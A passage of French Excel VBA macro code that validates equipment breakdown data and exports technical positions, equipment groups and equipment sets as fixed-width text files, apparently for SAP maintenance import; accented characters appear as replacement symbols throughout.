              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 29).Value = var_licence
              'prefixe = libel_prefixe + Num_ligne
              'var_libel_erreur = var_libel_erreur + test_long(20, prefixe, "18")
              'ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 29).Value = prefixe
              'ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 18).Value = prefixe
              '30 Code Mabec
              var_libel_erreur = var_libel_erreur + test_long(20, var_sacim, "26")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 30).Value = var_sacim
              '31 Libelle Mat|fffd|riel de l'|fffd|quipement obl(30)
              If var_libel_four = vbNullString Then var_libel_erreur = var_libel_erreur + "(4)"
              var_libel_erreur = var_libel_erreur + test_long(30, var_libel_four, "19")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 31).Value = var_libel_four
              '32 niveau de l'|fffd|quipement obl(3)
              var_libel_erreur = var_libel_erreur + test_long(3, var_niveau, "20")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 32).Value = var_niveau
              '33 Reference fournisseur de l'|fffd|quipement obl(25)
              var_libel_erreur = var_libel_erreur + test_long(25, var_ref_four, "22")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 33).Value = var_ref_four
              '34 nom fournisseur de l'|fffd|quipement obl(30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_nom_four, "21")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 34).Value = var_nom_four
              '35 Reference integrateur (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_ref_int, "24")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 35).Value = var_ref_int
              '36 Nom int|fffd|grateur (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_nom_int, "23")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 36).Value = var_nom_int
              '37 Quantit|fffd| de l'|fffd|quipement
              var_libel_erreur = var_libel_erreur + test_long(3, Var_qte, "32")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 37).Value = Var_qte
              '38 Mn|fffd|monique
              '39 Cat|fffd|gorie d'|fffd|quipement
              '40 Code projet (produit fabriqu|fffd|
              '41 Modele Gmao
              '42 Famille GMAO obl  30
              var_libel_erreur = var_libel_erreur + test_long(6, var_code_famille, "25")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 42).Value = var_code_famille
              '43 Capacit|fffd| GMAO
              '44 Alimentation GMAO
              '45 A Maintenir 1
              var_libel_erreur = var_libel_erreur + test_long(1, var_maintenir, "27")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 45).Value = var_maintenir
              '46 UET Fabrication
              '47 Dessin|fffd| par
              '48 Indice de l'inventaire
              '49 Date de l'indice
              '50 Responsable de l'indice
              '51 Num|fffd|ro de la pi|fffd|ce produit 1
              '52 Indice de la piece produit 1
              '53 Num|fffd|ro de la pi|fffd|ce produit 2
              '54 Indice de la piece produit 2
              '55 Num|fffd|ro de la pi|fffd|ce produit 3
              '56 Indice de la piece produit 3
              '57 Num|fffd|ro de la pi|fffd|ce produit 4
              '58 Indice de la piece produit 4
              'point de pose
              If var_pt = vbNullString Then var_libel_erreur = var_libel_erreur + "(1)"
              
              'Recherche libell|fffd| DIVISION
              var_temp = Libelle_Code_Process("DIV", var_div, var_div)
    
              If var_temp = vbNullString Then var_libel_erreur = var_libel_erreur + "(3)"
    
              If var_libel_erreur <> vbNullString Then
                  var_libel_erreur = Libel_Nok & " " + var_libel_erreur
                  ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, 2).Value = var_libel_erreur
                  ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = var_libel_erreur
                  nb_NOK = nb_NOK + 1
              Else
                 ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, 2).Value = Libel_Ok
              End If
              iEcriture = iEcriture + 1
    
          End If 'test var etat
      End If
      ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub




'*************************************************************
' Programme Principal
'*************************************************************
Sub PREPA_SIMON(itraitement)
    Dim i As Integer, j As Integer
    
    'Fichiers activit|fffd|s
    Close
    affiche_cadre
    i = 6
    j = 10
       
    ' Lancement du chargement
    iDebut = 4 ' CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    'If iDebut = 0 Then iDebut = 2
    'chargemnt prefixe pour num licence provisoire lecture debut +3

    iDonn|fffd|es = iDebut
    While var_efp = vbNullString
        Lire_ligne (2)
        iDonn|fffd|es = iDonn|fffd|es + 1
    Wend
    chg_var_liber_prefixe
    ThisWorkbook.Sheets(shCde_Simon).Cells(5, 6).Value = libel_prefixe
    
    iDonn|fffd|es = iDebut
    iEcriture = 2
    
    With ThisWorkbook.Sheets(shDecoupage)
      ' .Activate
        'nb lignes fichier donn|fffd|es
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
            iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
        ThisWorkbook.Sheets(shCde_Simon).Cells(i, j).Value = iDonn|fffd|es - iDebut
        iDonn|fffd|es = iDebut
        '***************************
        'Traitement Poste Technique
        '***************************
        nb_NOK = 0
        var_precedent = vbNullString
        var_savdiv = vbNullString
        var_savmetier = vbNullString
        var_savligne = vbNullString
        var_savefp = vbNullString
        var_savfp = vbNullString
        var_savsfp = vbNullString
        var_savop = vbNullString
        If itraitement < 2 Then
            Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString) And Not (Arret_Traitement)
                PosteTechnique
                iDonn|fffd|es = iDonn|fffd|es + 1
                ThisWorkbook.Sheets(shCde_Simon).Cells(i + 2, j).Value = iDonn|fffd|es - iDebut
            Loop
            ThisWorkbook.Sheets(shCde_Simon).Cells(19, 7).Value = "X"
            ThisWorkbook.Sheets(shCde_Simon).Cells(i + 2, j).Value = iEcriture - 2
            If nb_NOK > 0 Then ThisWorkbook.Sheets(shCde_Simon).Cells(i + 2, j + 1).Value = nb_NOK: ThisWorkbook.Sheets(shCde_Simon).Cells(i + 2, j + 2).Value = "Non OK"
        End If
        nb_NOK = 0

        If itraitement = 0 Or itraitement = 2 Then
            '************************************
            'Traitement GROUPE d'ENSEMBLE A CREER
            '************************************
            iDonn|fffd|es = iDebut
            iEcriture = 2
            Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString) And Not (Arret_Traitement)
                GE_creer
                iDonn|fffd|es = iDonn|fffd|es + 1
                ThisWorkbook.Sheets(shCde_Simon).Cells(i + 4, j).Value = iDonn|fffd|es - iDebut
            Loop
            ThisWorkbook.Sheets(shCde_Simon).Cells(i + 4, j).Value = iEcriture - 2
            If nb_NOK > 0 Then ThisWorkbook.Sheets(shCde_Simon).Cells(i + 4, j + 1).Value = nb_NOK: ThisWorkbook.Sheets(shCde_Simon).Cells(i + 4, j + 2).Value = "Non OK"

            nb_NOK = 0
            '***************************************
            'Traitement GROUPE d' ENSEMBLE A modifier
            '***************************************
            iDonn|fffd|es = iDebut
            iEcriture = 2
            Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString) And Not (Arret_Traitement)
                GE_modifier
                iDonn|fffd|es = iDonn|fffd|es + 1
                ThisWorkbook.Sheets(shCde_Simon).Cells(i + 5, j).Value = iDonn|fffd|es - iDebut
            Loop
            ThisWorkbook.Sheets(shCde_Simon).Cells(i + 5, j).Value = iEcriture - 2
            ThisWorkbook.Sheets(shCde_Simon).Cells(19, 9).Value = "X"
            If nb_NOK > 0 Then ThisWorkbook.Sheets(shCde_Simon).Cells(i + 5, j + 1).Value = nb_NOK: ThisWorkbook.Sheets(shCde_Simon).Cells(i + 5, j + 2).Value = "Non OK"
        End If
        nb_NOK = 0

        If itraitement = 0 Or itraitement = 3 Then
            '****************************
            'Traitement ENSEMBLE A CREER
            '****************************
            iDonn|fffd|es = iDebut
            iEcriture = 2
            var_SavNumGe = vbNullString
            mem_num_sap_ge = vbNullString
            Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString) And Not (Arret_Traitement)
                Ens_creer
                iDonn|fffd|es = iDonn|fffd|es + 1
                ThisWorkbook.Sheets(shCde_Simon).Cells(i + 7, j).Value = iDonn|fffd|es - iDebut
            Loop
            ThisWorkbook.Sheets(shCde_Simon).Cells(i + 7, j).Value = iEcriture - 2
            If nb_NOK > 0 Then ThisWorkbook.Sheets(shCde_Simon).Cells(i + 7, j + 1).Value = nb_NOK: ThisWorkbook.Sheets(shCde_Simon).Cells(i + 7, j + 2).Value = "Non OK"
            '******************************
            'Traitement ENSEMBLE A MODIFIER
            '******************************
            nb_NOK = 0
            iDonn|fffd|es = iDebut
            iEcriture = 2
            var_SavNumGe = vbNullString
            Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString) And Not (Arret_Traitement)
                Ens_modifier
                iDonn|fffd|es = iDonn|fffd|es + 1
                ThisWorkbook.Sheets(shCde_Simon).Cells(i + 8, j).Value = iDonn|fffd|es - iDebut
            Loop
            ThisWorkbook.Sheets(shCde_Simon).Cells(i + 8, j).Value = iEcriture - 2
            If nb_NOK > 0 Then ThisWorkbook.Sheets(shCde_Simon).Cells(i + 8, j + 1).Value = nb_NOK: ThisWorkbook.Sheets(shCde_Simon).Cells(i + 8, j + 2).Value = "Non OK"
        End If
    End With
    '*********************
    'Fin du traitement
    '*********************
    fin_trait
End Sub


Sub traitement_tout()
    PREPA_SIMON (0)

End Sub


Sub traitement_pt()
    Sheets(shPt).Select
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shCde_Simon).Activate
    PREPA_SIMON (1)
End Sub


Sub traitement_GE()
    Sheets(shGE_ACreer).Select
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    Sheets(shGE_AModifier).Select
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shCde_Simon).Activate
    PREPA_SIMON (2)
End Sub


Sub traitement_ens()
    ' Suppression des lignes ant|fffd|rieures
    Sheets(shENS_ACreer).Select
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    Sheets(shENS_AModifier).Select
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shCde_Simon).Activate
    ' Lancement du traitement
    PREPA_SIMON (3)
End Sub


Sub affiche_cadre()
    Dim i, j As Integer
    'effacement zone
    Range("F6:n16").Select
    Selection.ClearContents
    Range("a1").Select
    i = 6
    j = 7
    ThisWorkbook.Sheets(shCde_Simon).Cells(i, j).Value = "Nb lignes"
    ThisWorkbook.Sheets(shCde_Simon).Cells(i + 2, j).Value = "PT"
    ThisWorkbook.Sheets(shCde_Simon).Cells(i + 4, j).Value = "GE |fffd| cr|fffd|er"
    ThisWorkbook.Sheets(shCde_Simon).Cells(i + 5, j).Value = "GE |fffd| modifier"
    ThisWorkbook.Sheets(shCde_Simon).Cells(i + 7, j).Value = "ENS |fffd| cr|fffd|er"
    ThisWorkbook.Sheets(shCde_Simon).Cells(i + 8, j).Value = "ENS |fffd| modifier"
End Sub


Sub fin_trait()
    Application.StatusBar = vbNullString
    MsgBox ("Le traitement est termin|fffd|.")
End Sub

Sub Verification()
    'v|fffd|rifie que les fichiers qui vont |fffd|tre utilis|fffd|s sont bien pr|fffd|sents
    Dim l As Integer, NbErr As Integer
    Dim Fichier As String
    l = 2
    NbErr = 0
    Application.StatusBar = "V|fffd|rification des fichiers"
    'NbDonn|fffd|es = ThisWorkbook.Sheets(shDecoupage).UsedRange.Rows.Count - iDonn|fffd|es
    With ThisWorkbook.Sheets(shDecoupage)
        Do While .Cells(l, 9) <> vbNullString
            Fichier = Repertoire_Stockage & "\" & .Cells(l, 9).Value & ".txt"
            If Dir(Fichier) = vbNullString Then
                NbErr = NbErr + 1
                .Cells(l, 9).Font.ColorIndex = 3    'rouge
                .Cells(l, 17).Value = "fichier manquant"
                .Cells(l, 18).Value = Fichier
            Else
                .Cells(l, 9).Font.ColorIndex = xlAutomatic
                .Cells(l, 17).Value = vbNullString
            End If
            l = l + 1
        Loop
    End With
    Application.StatusBar = vbNullString
    If NbErr > 0 Then MessageErreur ("Il manque " & NbErr & " fichier(s) de descriptif d'activit|fffd|. V|fffd|rifier les donn|fffd|es")
End Sub

Sub MessageErreur(Msg As String)
    Arret_Traitement = True
    If iDonn|fffd|es > 0 Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 17).Value = "KO: " & Msg
    MsgBox Msg, vbCritical, "macro"
    Close
    End
End Sub

Sub ChoixFichierDonnees()
    'S|fffd|lection du fichier de donn|fffd|es |fffd| traiter
    'Il doit comporter une feuille s'appelant Decoupage
    'postionne la variable globale 'DataWB'
    Dim i As Integer
    'demande le fichier |fffd| ouvrir
    Set DataWS = Nothing
    fichierDonnees = Application.GetOpenFilename("Fichiers Excel (*.xls), *.xls", , "S|fffd|lectionner le fichier de donn|fffd|es")
    If fichierDonnees = False Then End
    'on teste s'il n'est pas d|fffd|j|fffd| ouvert
    For i = 1 To Workbooks.Count
        If Workbooks(i).FullName = fichierDonnees Then
            Workbooks(i).Activate
            Exit For
        End If
    Next i
    If i = Workbooks.Count + 1 Then Workbooks.Open Filename:=fichierDonnees, AddToMRU:=True
    'v|fffd|rification qu'il comporte bien un onglet 'Donn|fffd|es'
    On Error GoTo WS_Err
    Set DataWS = ActiveWorkbook.Worksheets(shDecoupage)
    On Error GoTo 0
    Exit Sub
WS_Err:
    MessageErreur "Le fichier s|fffd|lectionn|fffd| doit avoir un onglet '" & shDecoupage & "'"
    On Error GoTo 0
End Sub


'*******************************************
' Chargement du tableau de Decoupage
'*******************************************
Sub Chargement_tbd()
    Dim i As Integer
    Dim j As Integer
    'effacement zone
    Range("F4:M16").Select
    Selection.ClearContents
    Range("F19:M20").Select
    Selection.ClearContents
    Range("a1").Select
    
    'choix du fichier |fffd| charger
    ChoixFichierDonnees
    Chemin = fichierDonnees
    
    j = 1
    i = 1
    Do While i <> 0
        i = VBA.InStr(j, Chemin, "\")
        j = j + 1
    Loop
    i = VBA.Len(Chemin) - j + 2
    Chemin = VBA.Right(Chemin, i)
    Chemin = VBA.Left(Chemin, i - 4)
    i = VBA.InStr(1, Chemin, "_TRA")
    If i = 0 Then i = VBA.InStr(1, Chemin, "_SAP")
    If i <> 0 Then
        Chemin = VBA.Left(Chemin, i - 1)
    End If
        
    ThisWorkbook.Sheets(shCde_Simon).Cells(4, 6).Value = Chemin
    On Error Resume Next
    ThisWorkbook.Sheets(shDecoupage).Delete
    On Error GoTo 0
    
    
    DataWS.Copy after:=ThisWorkbook.Sheets(shCde_Simon)
    DataWS.parent.Close False
    
    'insertion colone Etat si inexistant

    ThisWorkbook.Worksheets(shDecoupage).Activate
    var_etat = ThisWorkbook.Sheets(shDecoupage).Range("b2").Value
    If var_etat <> "Etat (S/T/TS)" Then
        Columns("B:B").Select
        Selection.Insert Shift:=xlToRight
        Range("B2").Select
        ActiveCell.FormulaR1C1 = "Etat"
        With ActiveCell.Characters(Start:=1, Length:=4).Font
            .Name = "Arial"
            .FontStyle = "Normal"
            .Size = 10
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .ColorIndex = xlAutomatic
        End With
    End If
    
    'nettoyage des feuilles
    ThisWorkbook.Worksheets(shPt).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shGE_ACreer).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shGE_AModifier).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shENS_ACreer).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shENS_AModifier).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp
    ThisWorkbook.Worksheets(shENS_ASupprimer).Activate
    Rows("2:65536").Select
    Selection.Delete Shift:=xlUp

    ThisWorkbook.Worksheets(shCde_Simon).Activate
    ThisWorkbook.Sheets(shCde_Simon).Cells(19, 6).Value = "X"
End Sub

'***********************************************
'
'   G|fffd|n|fffd|ration du fichier PT au format TXT
'   modif en cours le 21-09-2004
'
'***********************************************
Sub PT_sap()
    Dim Tab_exp As String
    Dim Lig As Integer
    Dim fileToOpen As Variant
'   s|fffd|lection du nom de fichier
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_PT_CREER.txt"
    fileToOpen = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt), *.txt", , "Indiquer o|fffd| enregistrer le fichier des Postes Techniques")
    ' S|fffd|lection du fichier
    If fileToOpen = False Then Exit Sub
    Open fileToOpen For Output As #1
    Print #1, VBA.Chr(255) & VBA.Chr(254);
    Lig = 2
    Fin = False
    While Not Fin
        If VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 2).Value) <> vbNullString Then
            ' Division  4 car
            Tab_exp = VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 2).Value)
            While VBA.Len(Tab_exp) < 4
                Tab_exp = Tab_exp + " "
            Wend
            ' langue    2 car
            Tab_exp = Tab_exp + VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 3).Value)
            While VBA.Len(Tab_exp) < 6
                Tab_exp = Tab_exp + " "
            Wend
            ' PT        30 car
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 4).Value), 1, 30)
            While VBA.Len(Tab_exp) < 36
                Tab_exp = Tab_exp + " "
            Wend
            ' D|fffd|signation    40 car
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 5).Value), 1, 40)
            While VBA.Len(Tab_exp) < 76
                Tab_exp = Tab_exp + " "
            Wend
            ' Localisation  10
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 6).Value), 1, 10)
            While VBA.Len(Tab_exp) < 86
                Tab_exp = Tab_exp + " "
            Wend
            ' Centre de Couts    10
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 7).Value), 1, 10)
            While VBA.Len(Tab_exp) < 96
                Tab_exp = Tab_exp + " "
            Wend
            'position ou Poste  4
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 8).Value), 1, 4)
            While VBA.Len(Tab_exp) < 100
                Tab_exp = Tab_exp + " "
            Wend
            ' Code ABC      1 car
             Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 9).Value), 1, 1)
            While VBA.Len(Tab_exp) < 101
                Tab_exp = Tab_exp + " "
            Wend
            ' Code Projet   30 car
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 10).Value), 1, 30)
            While VBA.Len(Tab_exp) < 131
                Tab_exp = Tab_exp + " "
            Wend
            ' Code Produit  30 car
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 11).Value), 1, 30)
            While VBA.Len(Tab_exp) < 161
                Tab_exp = Tab_exp + " "
            Wend
            ' A maintenir   1 car
            Tab_exp = Tab_exp + VBA.Mid(VBA.UCase(ThisWorkbook.Sheets(shPt).Cells(Lig, 12).Value), 1, 1)
            While VBA.Len(Tab_exp) < 162
                Tab_exp = Tab_exp + " "
            Wend
            Print #1, VBA.StrConv(Tab_exp, vbUnicode); VBA.StrConv(vbNewLine, vbUnicode);
            Lig = Lig + 1
        Else
            Fin = True
        End If
    Wend
    Close #1
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(fileToOpen), vbMaximizedFocus
End Sub


Sub GE_SAP()
    Dim FichierSortie As Variant
    Dim RangeAExporter As Range
    If libel_prefixe = vbNullString Then chg_var_liber_prefixe
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_GE_CREER.txt"
    FichierSortie = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt),*.txt", , "Indiquer o|fffd| enregistrer le fichier des Groupes d'Ensembles |fffd| cr|fffd|er")
    If FichierSortie = False Then Exit Sub
    'mise a "T" de la ligne GE a creer
    iDebut = 4 'CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    iDonn|fffd|es = iDebut
    With ThisWorkbook.Sheets(shDecoupage)
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
           Lire_ligne (2)
           If var_niveau = "GE" And VBA.InStr(1, var_numsap, libel_prefixe) <> 0 And var_etat = "S" Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "TS"
           If var_niveau = "GE" And VBA.InStr(1, var_numsap, libel_prefixe) <> 0 And var_etat = vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "T"
           ThisWorkbook.Sheets(shCde_Simon).Cells(10, 10).Value = iDonn|fffd|es - iDebut + 1
           iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
    End With
    ThisWorkbook.Sheets(shCde_Simon).Cells(19, 10).Value = "X"
    With ThisWorkbook.Worksheets(shGE_ACreer)
        Set RangeAExporter = .Range(.Cells(2, 3), .Cells(.UsedRange.Rows.Count, 60))
    End With
    SaveRangeAsFixedText RangeAExporter, Array(4, 2, 18, 20, 30, 18, 20, 1, 1, 4, 4, 1, 40, 30, 10, 25, 1, 10, 8, 10, 12, 4, 17, 5, 8, 8, 8, 30, 20, 18, 30, 3, 25, 30, 30, 30, 17, 10, 1, 30, 25, 6, 25, 25, 1, 30, 30, 30, 8, 30, 30, 30, 30, 30, 30, 30, 30, 30), CStr(FichierSortie)
    MsgBox "Fichier export|fffd| dans " & FichierSortie, vbInformation
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(FichierSortie), vbMaximizedFocus
End Sub

Sub ENS_SAP()
    Dim FichierSortie As Variant
    Dim RangeAExporter As Range
    If libel_prefixe = vbNullString Then chg_var_liber_prefixe
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_ENS_CREER.txt"
    FichierSortie = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt),*.txt", , "Indiquer o|fffd| enregistrer le fichier des Ensembles |fffd| cr|fffd|er")
    If FichierSortie = False Then Exit Sub
    'mise |fffd| "T" de la ligne E |fffd| creer
    iDebut = 4 'CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    iDonn|fffd|es = iDebut
    With ThisWorkbook.Sheets(shDecoupage)
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
            Lire_ligne (2)
            If var_niveau = "E" And VBA.InStr(1, var_numsap, libel_prefixe) <> 0 And var_etat = "S" Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "TS"
            If var_niveau = "E" And VBA.InStr(1, var_numsap, libel_prefixe) <> 0 And var_etat = vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "T"
            ThisWorkbook.Sheets(shCde_Simon).Cells(13, 10).Value = iDonn|fffd|es - iDebut + 1
            iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
    End With
    ThisWorkbook.Sheets(shCde_Simon).Cells(19, 12).Value = "X"
    With ThisWorkbook.Worksheets(shENS_ACreer)
        Set RangeAExporter = .Range(.Cells(2, 3), .Cells(.UsedRange.Rows.Count, 60))
    End With
    SaveRangeAsFixedText RangeAExporter, Array(4, 2, 18, 20, 30, 18, 20, 1, 1, 4, 4, 1, 40, 30, 10, 25, 1, 10, 8, 10, 12, 4, 17, 5, 8, 8, 8, 30, 20, 18, 30, 3, 25, 30, 30, 30, 17, 10, 1, 30, 25, 6, 25, 25, 1, 30, 30, 30, 8, 30, 30, 30, 30, 30, 30, 30, 30, 30), CStr(FichierSortie)
    MsgBox "Fichier export|fffd| dans " & FichierSortie, vbInformation
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(FichierSortie), vbMaximizedFocus
End Sub

Sub GE_MOD_SAP()
    Dim FichierSortie As Variant
    Dim RangeAExporter As Range
    If libel_prefixe = vbNullString Then chg_var_liber_prefixe
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_GE_MOD.txt"
    FichierSortie = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt),*.txt", , "Indiquer o|fffd| enregistrer le fichier des Ensembles |fffd| modifier")
    If FichierSortie = False Then Exit Sub
    'mise |fffd| "T" de la ligne GE |fffd| modifier
    iDebut = 4 'CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    iDonn|fffd|es = iDebut
    With ThisWorkbook.Sheets(shDecoupage)
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
            Lire_ligne (2)
            If var_niveau = "GE" And VBA.InStr(1, var_numsap, libel_prefixe) = 0 And var_etat = vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "T"
            If var_niveau = "GE" And VBA.InStr(1, var_numsap, libel_prefixe) = 0 And var_etat = "S" Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "TS"
            ThisWorkbook.Sheets(shCde_Simon).Cells(11, 10).Value = iDonn|fffd|es - iDebut + 1
            iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
    End With
    ThisWorkbook.Sheets(shCde_Simon).Cells(20, 10).Value = "X"
    With ThisWorkbook.Worksheets(shGE_AModifier)
        Set RangeAExporter = .Range(.Cells(2, 3), .Cells(.UsedRange.Rows.Count, 60))
    End With
    SaveRangeAsFixedText RangeAExporter, Array(4, 2, 18, 20, 30, 18, 20, 1, 1, 4, 4, 1, 40, 30, 10, 25, 1, 10, 8, 10, 12, 4, 17, 5, 8, 8, 8, 30, 20, 18, 30, 3, 25, 30, 30, 30, 17, 10, 1, 30, 25, 6, 25, 25, 1, 30, 30, 30, 8, 30, 30, 30, 30, 30, 30, 30, 30, 30), CStr(FichierSortie)
    MsgBox "Fichier export|fffd| dans " & FichierSortie, vbInformation
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(FichierSortie), vbMaximizedFocus
End Sub


Sub ENS_MOD_SAP()
    Dim FichierSortie As Variant
    Dim RangeAExporter As Range
    If libel_prefixe = vbNullString Then chg_var_liber_prefixe
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_ENS_MOD.txt"
    FichierSortie = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt),*.txt", , "Indiquer o|fffd| enregistrer le fichier des Ensembles |fffd| modifier")
    If FichierSortie = False Then Exit Sub
    'mise |fffd| "T" de la ligne ENS |fffd| modifier
    iDebut = 4 'CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    iDonn|fffd|es = iDebut
    With ThisWorkbook.Sheets(shDecoupage)
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
            Lire_ligne (2)
            If var_niveau = "E" And VBA.InStr(1, var_numsap, libel_prefixe) = 0 And var_etat = vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "T"
            ThisWorkbook.Sheets(shCde_Simon).Cells(14, 10).Value = iDonn|fffd|es - iDebut + 1
            iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
    End With
    
    ThisWorkbook.Sheets(shCde_Simon).Cells(20, 12).Value = "X"
    With ThisWorkbook.Worksheets(shENS_AModifier)
        Set RangeAExporter = .Range(.Cells(2, 3), .Cells(.UsedRange.Rows.Count, 60))
    End With
    SaveRangeAsFixedText RangeAExporter, Array(4, 2, 18, 20, 30, 18, 20, 1, 1, 4, 4, 1, 40, 30, 10, 25, 1, 10, 8, 10, 12, 4, 17, 5, 8, 8, 8, 30, 20, 18, 30, 3, 25, 30, 30, 30, 17, 10, 1, 30, 25, 6, 25, 25, 1, 30, 30, 30, 8, 30, 30, 30, 30, 30, 30, 30, 30, 30), CStr(FichierSortie)
    MsgBox "Fichier export|fffd| dans " & FichierSortie, vbInformation
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(FichierSortie), vbMaximizedFocus
End Sub


Sub ENS_SUP_SAP()
    Dim FichierSortie As Variant
    Dim RangeAExporter As Range
    If libel_prefixe = vbNullString Then chg_var_liber_prefixe
    'mise |fffd| "T" de la ligne ENS |fffd| modifier
    iDebut = 4 ' CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    iDonn|fffd|es = iDebut
    With ThisWorkbook.Sheets(shDecoupage)
        Do While (.Range("A" & iDonn|fffd|es).Value <> vbNullString)
            Lire_ligne (2)
            If var_niveau = "E" And VBA.InStr(1, var_numsap, libel_prefixe) = 0 And var_etat = "S" Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = "TS"
